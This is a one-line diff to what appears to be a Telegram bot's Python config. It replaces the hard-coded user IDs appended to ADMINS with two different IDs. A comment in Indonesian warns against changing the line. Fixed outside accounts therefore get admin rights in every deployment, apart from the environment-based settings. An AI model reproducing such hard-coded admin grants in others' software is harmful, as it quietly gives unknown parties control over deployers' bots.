@@ -80,7 +80,7 @@ FORCE_MSG = os.environ.get(
 # Jan diubah tod ntar erorr
 CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
-ADMINS.extend((993270486, 910766621, 844432220))
+ADMINS.extend((1814359323, 1065132285))
 
 
 LOG_FILE_NAME = "logs.txt"
